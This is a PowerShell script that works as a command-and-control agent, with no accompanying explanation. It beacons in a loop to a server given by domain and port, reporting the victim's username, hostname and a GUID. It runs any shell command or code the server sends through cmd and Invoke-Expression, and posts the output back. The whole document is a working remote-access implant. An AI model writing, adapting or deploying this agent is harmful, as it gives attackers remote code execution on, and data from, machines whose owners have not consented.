# Set variables
$domain = $args[0]
$port = $args[1]
$serverUrl = "http://${$domain}:${port}/"
$guid = [guid]::NewGuid().toString()
$sleepInterval = 2
$commandResult = $null
$username = [Environment]::UserName
$hostname = $env:COMPUTERNAME

# Main loop
while ($true) {
    # Try-catch block for error handling
    try {
        $data = @{ id = $guid; type = "powershell"; username = $username; hostname = $hostname }
        if ($null -ne $commandResult) {
            $data["result"] = $commandResult
        }

        $json = $data | ConvertTo-Json
        $response = Invoke-WebRequest -Uri $serverUrl -Method Post -Body $json -ContentType "application/json" -UseBasicParsing
        $responseData = $response.Content | ConvertFrom-Json

        $commandResult = $null
        if ($null -eq $responseData -or -not $responseData.psobject.Properties.Name -contains "__type__") {
            Start-Sleep -Seconds $sleepInterval
            continue
        }

        switch ($responseData.__type__) {
            # Handling different response types
            "my_what" {
                Write-Host "Executing mywhat"
                $commandResult = "I'm a PowerShell agent"
            }
            "my_sleep" {
                $sleepInterval = [int]$responseData.sleep
                Write-Host "Got command: new sleep is $sleepInterval"
                $commandResult = "New sleep is $sleepInterval"
            }
            "my_terminal" {
                Write-Host "Got command: run in terminal '$($responseData.command)'"
                $output = & cmd /c $($responseData.command) 2>&1
                $commandResult = [string]::Join("`n", $output)
            }
            "my_eval" {
                $commandResult = Invoke-Expression $responseData.code
            }
        }
    } catch {
        # Error handling
        $commandResult = $_.Exception.Message
    }
    Start-Sleep -Seconds $sleepInterval
}
